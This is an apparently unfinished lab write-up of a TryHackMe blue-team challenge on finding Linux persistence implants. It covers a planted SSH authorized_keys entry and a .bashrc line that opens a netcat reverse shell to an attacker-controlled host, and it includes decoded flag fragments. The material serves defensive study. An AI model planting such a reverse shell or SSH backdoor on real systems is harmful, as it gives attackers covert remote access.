<h1 align="center">Challenge 062 - Hide and Seek </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/3efe3842-4146-4b91-8c21-0ef6da84f374" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

As I'm working with a SOC team right now, I think it might help to get some basic blue teaming knowledge into my head. This challenge focuses on conducting a live system analysis to uncover post-compromise activity related to persistence mechanisms.

A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring that Cipher can return whenever he pleases. Here's the note.

```
ubuntu@tryhackme:~$ cat for_specter.txt
Dear Specter,

I must say, it?s been a thrill dancing through your systems. You lock the doors, I pick the locks. You set up alarms, I waltz right past them. But today, my dear adversary, I?ve left you a little game.

I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I?m giving you a sporting chance to find them. Each one has a clue, because where?s the fun in a silent hack?

- Time is on my side, always running like clockwork.
- A secret handshake gets me in every time.?
- Whenever you set the stage, I make my entrance.?
- I run with the big dogs, booting up alongside the system.?
- I love welcome messages.

Find them all, and you might just earn a little respect. Miss one, and well? let's just say I?ll be back before you even realize I never left.

Happy hunting, Phantom. May the best ghost win.

- Cipher
```

To start with I settled on tackling every hint separately.

## Time is on my side, always running like clockwork.

## A secret handshake gets me in every time.
This hint screams authentication bypass via credentials that don't expire. We need to do a cryptographic exchange that proves our validity. On Linux that would easily be possible through SSH key-based access. They get us in every time, as they don't expire by default, survive password resets, are often ignored for years and still work even if MFA is added. With this gained knowledge I looked through all users in the hopes of finding some keys and indeed quickly found an interesting directory called *.ssh*

```
ubuntu@tryhackme:/home$ sudo ls -la /home/zeroday
total 28
drwxr-x--- 3 zeroday zeroday 4096 Mar 13  2025 .
drwxr-xr-x 8 root    root    4096 Mar  7  2025 ..
-rw------- 1 zeroday zeroday   27 Mar 13  2025 .bash_history
-rw-r--r-- 1 zeroday zeroday  220 Mar  7  2025 .bash_logout
-rw-r--r-- 1 zeroday zeroday 3771 Mar  7  2025 .bashrc
-rw-r--r-- 1 zeroday zeroday  807 Mar  7  2025 .profile
drwxrwxr-x 2 zeroday zeroday 4096 Mar  7  2025 .ssh
```

In it we find a public key labelled .authorized keys. So the SSH key persistance is pretty much confirmed. When cat'ing it we see the following output

```
ubuntu@tryhackme:/home$ sudo cat /home/zeroday/.ssh/.authorized_keys
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

Something seems unusual with this authorized_keys file. The key type and base64-key itself are common practice and what's to be expected. It only starts getting weird, when we are looking at the comment part. This section should be human-readable, yet here it looks like it's hex encoded. When decoding it, we get the second part of our flag

<img width="1406" height="403" alt="Bildschirmfoto vom 2026-02-02 22-58-57" src="https://github.com/user-attachments/assets/724f1aec-0ef1-4a76-b764-f547180bdf88" />


## Whenever you set the stage, I make my entrance.
This is a strong clue for login/session initialization. Whenever a user (us) - so Specter - logs in and the environment is "set". Logically it would make sense to look up a file that is executed every time an interactive Bash shell starts. The .bashrc is one of those file, that runs on every login. 

```
ubuntu@tryhackme:/home$ sudo cat /home/specter/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells. 
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) 
# for examples 

# If not running interactively, don't do anything 
case $- in 
    *i*) ;; 
      *) return;; 
esac 

# don't put duplicate lines or lines starting with space in the history. 
# See bash(1) for more options 
HISTCONTROL=ignoreboth 

# append to the history file, don't overwrite it 
shopt -s histappend 

nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
...
```

While just looking at that snippet of code one specific line stands out immediately

```
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

This looks like a classic reverse-shell. With netcat, hostname, port (443) and remote server all integrated. 2>/dev/null ensures that error output is suppressed, making all activity quiet and stealthy. So every time we - the user - start a shell, the system automatically connects back to Cipher and gives him a live Bash shell. A smart persistence mechanism. We receive some hex string once again, which when decoded spits out some base64 encoding.

<img width="1406" height="403" alt="image" src="https://github.com/user-attachments/assets/ad4ed163-e33d-4d78-b8d0-6f791cb259bc" />

When decoding the base64 encoding, we get the third part of our message.

<img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/652e3c9e-edbd-4d60-9640-610d8bb2abb8" />

## I run with the big dogs, booting up alongside the system.

## I love welcome messages.
